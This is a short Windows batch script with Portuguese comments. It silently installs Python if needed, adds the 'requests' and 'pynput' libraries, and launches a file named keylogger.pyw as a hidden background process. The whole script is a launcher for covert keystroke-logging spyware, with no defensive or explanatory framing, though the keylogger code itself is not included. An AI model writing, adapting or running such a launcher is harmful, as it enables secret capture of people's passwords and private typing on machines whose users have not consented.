@echo off

rem Verifique se o Python já está instalado
python --version
if %errorlevel% == 0 (
  rem Python já está instalado
  rem Instale as bibliotecas necessárias
  python -m pip install requests pynput
  rem Rode o script em um novo processo em segundo plano
  start /b pythonw ./keylogger.pyw
  exit /b
)

rem Python não está instalado
rem Baixe o instalador do Python
rem https://www.python.org/downloads/
curl -LO https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe

rem Execute o instalador do Python
python-3.10.5-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_msvs2015_runtime=1

rem Adicione o Python ao PATH do sistema
setx PATH "%PATH%;%ProgramFiles%\Python310\Scripts"

rem Instale as bibliotecas necessárias
python -m pip install requests pynput

rem Rode o script em um novo processo em segundo plano
start /b pythonw ./keylogger.pyw